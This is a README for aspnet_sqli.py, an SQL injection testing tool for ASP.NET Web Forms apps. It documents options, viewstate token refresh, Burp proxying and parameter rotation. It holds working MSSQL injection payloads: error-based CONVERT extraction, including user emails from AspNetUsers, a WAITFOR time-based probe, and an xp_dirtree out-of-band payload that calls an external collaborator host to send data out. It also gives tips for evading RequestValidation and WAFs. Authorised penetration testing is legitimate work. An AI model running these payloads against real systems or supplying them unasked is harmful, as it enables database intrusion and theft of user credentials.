# aspnet_sqli.py

A targeted SQL injection testing tool for ASP.NET applications. Handles ASP.NET Web Forms token refresh (`__VIEWSTATE`, `__EVENTVALIDATION`) automatically on every request, routes traffic through Burp Suite, and uses differential analysis to identify injection points.

Built during a real engagement against an ASP.NET 4.8 Web Forms application. Designed to be more reliable than sqlmap on ASP.NET targets where viewstate MAC validation causes stale token rejections.

---

## Features

- **Raw request file input** — save directly from Burp, no manual param extraction
- **Automatic token refresh** — GETs the target page before every POST to grab fresh `__VIEWSTATE` and `__EVENTVALIDATION` tokens
- **Configurable token fields** — works with Web Forms, MVC (`__RequestVerificationToken`), or Web API (no tokens)
- **Differential detection** — flags changes in HTTP status code or response size
- **Hint extraction** — parses `Conversion failed` errors to surface extracted data inline, covers MSSQL, MySQL, Oracle, PostgreSQL
- **Mirror param** — copies payload into a second field (e.g. `ConfirmPassword`) to avoid false positives from field mismatch
- **Static param overrides** — force specific values on non-injected fields per request
- **Warmup phase** — sends priming requests to exhaust server-side EF/DB init retries before the payload loop
- **Burp proxy integration** — all traffic visible in Burp history by default
- **Response dump** — prints `Exception Details` section of 500 responses on hits for manual review

---

## Requirements

```bash
pip install requests
```

Python 3.10+ required (uses `list[str]` and `tuple` type hints).

---

## Quick Start

**1. Save your request from Burp**

In Burp Proxy history, right-click the target POST → Save item → `req.txt`

The file should be a raw HTTP request including headers and body:

```
POST /account/register HTTP/1.1
Host: example.com
Cookie: ARRAffinity=abc123; ASP.NET_SessionId=xyz789
Content-Type: application/x-www-form-urlencoded
...

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=...&ctl00%24MainContent%24Password=ValidPass1
```

**2. Run**

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt
```

All traffic goes through Burp at `http://127.0.0.1:8080` by default.

---

## Usage

```
python3 aspnet_sqli.py -r REQUEST -p PAYLOADS [options]
```

### Required

| Argument | Description |
|---|---|
| `-r`, `--request` | Raw HTTP request file saved from Burp |
| `-p`, `--payloads` | Payload file — one payload per line, `#` for comments |

### Injection Control

| Argument | Default | Description |
|---|---|---|
| `--inject-param` | `ctl00$MainContent$Password` | Body parameter to inject into |
| `--mirror-param` | none | Copy payload into this param too (e.g. `ConfirmPassword`) |
| `--set-param KEY=VALUE` | none | Override a param on every request — repeatable |

### Detection

| Argument | Default | Description |
|---|---|---|
| `--baseline-string` | _(empty)_ | Text expected in a clean response. If absent, uses status+size diff only |

### Token Handling

| Argument | Default | Description |
|---|---|---|
| `--token-fields` | `__VIEWSTATE,__EVENTVALIDATION,__VIEWSTATEGENERATOR` | Hidden fields to refresh before each request. Pass `""` to disable |

### Warmup

| Argument | Default | Description |
|---|---|---|
| `--warmup` | `0` | Number of priming requests before payload loop |
| `--warmup-payload` | `warmup'` | Payload to use during warmup phase |

### Network

| Argument | Default | Description |
|---|---|---|
| `--proxy` | `http://127.0.0.1:8080` | Burp proxy URL |
| `--no-proxy` | — | Send directly to target, bypass proxy |
| `--http` | — | Use `http://` instead of `https://` |
| `--verify` | — | Enable SSL cert verification (off by default for Burp CA) |
| `--timeout` | `90` | Request timeout in seconds |
| `--delay` | `0.5` | Seconds between requests |

### Output

| Argument | Description |
|---|---|
| `--dump` | Print `Exception Details` section of response on every HIT |

---

## Examples

### Web Forms — Password Field (Standard)

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt \
  --inject-param "ctl00$MainContent$Password" \
  --baseline-string "Create a new account"
```

### Web Forms — Registration Form With ConfirmPassword

Mirrors the payload into `ConfirmPassword` to prevent field-mismatch false positives:

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt \
  --inject-param "ctl00$MainContent$Password" \
  --mirror-param "ctl00$MainContent$ConfirmPassword" \
  --baseline-string "Create a new account"
```

### Web Forms — Override Email Field

Forces a known-good email on every request regardless of what is in `req.txt`:

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt \
  --set-param "ctl00$MainContent$Email=safe@example.com"
```

### ASP.NET MVC — CSRF Token Refresh

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt \
  --inject-param "Password" \
  --token-fields "__RequestVerificationToken" \
  --baseline-string "Invalid login attempt"
```

### Web API — No Tokens, Direct

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt \
  --inject-param "password" \
  --token-fields "" \
  --baseline-string "" \
  --no-proxy
```

### With Warmup (EF LocalDB Init Exhaustion)

For endpoints where Entity Framework's `CreateDatabaseIfNotExists` fires on the first few requests and masks the actual SQL error:

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt \
  --warmup 6 \
  --baseline-string "Register"
```

### Dump Response on Hits

Prints the `Exception Details` section of any 500 response inline — useful when the hint regex doesn't capture the extracted value:

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt --dump
```

---

## Payload File Format

One payload per line. Lines starting with `#` are ignored.

```
# Sanity checks — these should return clean
ValidPass1
ValidPass1--

# Quote probes
ValidPass1'
ValidPass1''

# MSSQL error-based extraction
ss' AND 1=CONVERT(int,@@version)-- wXyW
ss' AND 1=CONVERT(int,DB_NAME())-- wXyW
ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers))-- wXyW

# MSSQL time-based
ss'; WAITFOR DELAY '0:0:5'-- wXyW

# OOB via xp_dirtree (replace with your Burp Collaborator host)
ss'; EXEC master..xp_dirtree '//your.collaborator.host/a'-- wXyW
```

A focused MSSQL extraction payload file (`mssql_extract.txt`) is included in this repo covering version, current user, DB enumeration, table enumeration, credential extraction from `AspNetUsers`, privilege checks, and OOB exfiltration.

---

## Output Interpretation

```
#     Status   Size      Time(ms)   Result     Payload
─────────────────────────────────────────────────────────────────────────────
1     200      8241      401        clean  ValidPass1
2     500      21267     547        HIT    ss' AND 1=CONVERT(int,@@version)--
       └─ EXTRACTED: Microsoft SQL Server 2019 (RTM-CU18)...
3     200      8241      398        clean  ss' AND 1=CONVERT(int,@@version)-- (no quote)
```

| Column | Meaning |
|---|---|
| Status | HTTP response code — 500 on injection errors |
| Size | Response body size in bytes — differential from baseline shown as `Δ+Nb` |
| Time(ms) | Round-trip time — useful for time-based blind detection |
| Result | `HIT` = status or size differs from baseline; `clean` = matches baseline |
| Hint | Extracted value or error type parsed from response body |

### Common Hint Values

| Hint | Meaning |
|---|---|
| `EXTRACTED: <value>` | MSSQL `Conversion failed` error — data extracted successfully |
| `EXTRACTED(MySQL): <value>` | MySQL XPATH error — data extracted |
| `Incorrect syntax near...` | SQL syntax error — injection point confirmed, adjust payload |
| `[ASP.NET RequestValidation]` | Input blocked by ASP.NET before reaching SQL — URL-encode or use CHAR() encoding |
| `[noise] SqlException...` | SQL exception present but not carrying extractable data |
| `TIMEOUT` | Request exceeded `--timeout` — relevant for time-based blind |

---

## How Token Refresh Works

ASP.NET Web Forms uses MAC-signed viewstate tokens tied to the server session. Replaying a captured token after it expires, or sending it with modified form fields, results in a `ViewStateException`. This causes sqlmap's `--csrf-token` approach to fail on multi-token pages.

This tool GETs the target page before every POST request and extracts fresh `__VIEWSTATE`, `__EVENTVALIDATION`, and `__VIEWSTATEGENERATOR` values using regex against the HTML. Those values are merged into the POST body before each injection attempt, ensuring the server accepts the request through viewstate validation before the injection reaches the application layer.

---

## Limitations

- URL-encoded POST bodies only — multipart and JSON bodies not supported
- Single injection parameter per run — rerun with different `--inject-param` for multiple params
- No automatic encoding bypass — if ASP.NET `RequestValidation` blocks a payload, manually CHAR-encode it
- Token refresh adds one extra GET request per payload — expect ~2x the number of requests shown in Burp history

---

## Detection and Responsible Use

This tool is intended for authorised penetration testing only. All traffic is routed through Burp Suite by default, leaving a full audit trail. Ensure you have written authorisation before use.

The tool does not attempt to bypass WAFs, IDS, or rate limiting by default. For evasion, adjust `--delay`, encode payloads manually, or route through Burp's match-and-replace rules.

---

## Author

Clark — Principal Security Engineer, Synack Red Team  
[Pattern Hacking](https://nostarch.com/) — No Starch Press

---

## Param Rotation

Instead of specifying a single `--inject-param`, `--rotate-params` tests every injectable parameter in the request automatically. Token fields, submit buttons, and ASP.NET infrastructure params are filtered out automatically.

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt --rotate-params
```

Output shows a separate payload run per parameter with its own hit count:

```
[*] Injecting → ctl00$MainContent$Email  |  32 payloads
1     200      8241      401        clean  ValidPass1
2     200      8241      398        clean  ValidPass1'
...

[*] Injecting → ctl00$MainContent$Password  |  32 payloads
1     200      8241      401        clean  ValidPass1
2     500      21267     547        HIT    ValidPass1'
       └─ Incorrect syntax near...
```

**Skip specific params during rotation:**

```bash
python3 aspnet_sqli.py -r req.txt -p payloads.txt --rotate-params \
  --skip-param "ctl00$MainContent$Email" \
  --skip-param "ctl00$MainContent$ConfirmPassword"
```

**ConfirmPassword auto-mirror** — when rotating and a `Password` param is detected, the tool automatically finds and mirrors the payload into the corresponding `ConfirmPassword` field to prevent field-mismatch false positives.

---

## Burp XML Mode

Export a set of requests from Burp Suite (Proxy history → select items → right-click → Save items → XML) and feed the entire export to the tool.

```bash
python3 aspnet_sqli.py -x burp_export.xml -p payloads.txt --rotate-params
```

The tool:
1. Parses every POST (and PUT/PATCH) request from the XML
2. Filters to requests with at least `--min-params` body parameters
3. Runs baseline confirmation on each
4. Rotates through all injectable params per request
5. Prints a consolidated summary at the end showing every finding grouped by endpoint and parameter

### Filtering XML Requests

```bash
# Only test requests with 3+ body params (avoids simple single-param endpoints)
python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params \
  --min-params 3

# Only test POST requests (exclude PUT/PATCH)
python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params \
  --xml-methods POST
```

### Fresh Cookies for XML Mode

Cookies in exported XML requests go stale. Provide fresh ones captured from Burp:

```bash
python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params \
  --cookies "ARRAffinity=abc123; ASP.NET_SessionId=xyz789; __AntiXsrfToken=def456"
```

`--cookies` overrides the cookies embedded in every request in the XML file.

### Final Summary (XML Mode)

After all requests are tested, a consolidated report groups findings by endpoint and parameter:

```
█████████████████████████████████████████
  FINAL SUMMARY — 12 request(s) tested
█████████████████████████████████████████

  [!] 2 injectable parameter(s) found across 2 endpoint(s)

  ┌─ https://example.com/account/register
  │  Parameter : ctl00$MainContent$Password
  │  Hits      : 8
  │  #4    500 | 547ms | 21267b
  │       Payload : ValidPass1'
  │       Hint    : Incorrect syntax near...
  └────────────────────────────────────────

  ┌─ https://example.com/account/resetpassword
  │  Parameter : ctl00$MainContent$Password
  │  Hits      : 2
  │  #31   500 | 493ms | 10822b
  │       Payload : ss'; EXEC master..xp_dirtree '//abc.oastify.com/a'--
  └────────────────────────────────────────
```

---

## Params Automatically Skipped During Rotation

The following are filtered out and never used as injection targets:

| Category | Examples |
|---|---|
| ASP.NET viewstate tokens | `__VIEWSTATE`, `__EVENTVALIDATION`, `__VIEWSTATEGENERATOR` |
| ASP.NET postback fields | `__EVENTTARGET`, `__EVENTARGUMENT` |
| Submit buttons | Params ending in `$ctl08`, `$Button`, `$Submit` |
| DevExpress infrastructure | Params starting with `DX` (`DXScript`, `DXCss`) |
| User-specified | Any param passed via `--skip-param` |
